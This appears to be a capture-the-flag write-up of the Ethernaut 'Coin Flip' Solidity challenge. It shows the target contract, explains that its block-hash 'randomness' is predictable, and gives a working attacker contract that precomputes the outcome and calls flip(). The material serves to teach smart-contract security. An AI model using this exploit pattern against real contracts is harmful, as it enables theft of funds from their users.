# Coin Flip

```javascript
pragma solidity ^0.4.18;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

According to source code here, Coin Side is decided by last block's hash value divides with a hardcode value.

Last block's hash value is a public number, with source code we can also predict the Coin Side.

Let's deploy a contract before which we design a function that will calculate the CoinSide before call target challnge to `flip()`.

```javascript
pragma solidity ^0.4.18;

contract CoinFlip {
  function CoinFlip() public {}
  function flip(bool _guess) public returns (bool) {}
}

contract CoinFlipCheater{
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function hack(address param) public{ /*param Is Your Zepplin Main Contract Address*/
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = (coinFlip==1);
        CoinFlip target = CoinFlip(param);
        target.flip(side);
    }
}
```

![](https://i.imgur.com/WnZ97ks.png)

Here's something tricky, seems Solidity try to fix something about Gas( probability Reentrant I think ;) ) that will sometime block our interaction.
![](https://i.imgur.com/ia9YNhw.png)
![](https://i.imgur.com/PEdmr3N.png)

Due to sometime fail in transaction, ensure your instance's `consecutiveWins` number before you submit the instance.
![](https://i.imgur.com/543ljJX.png)
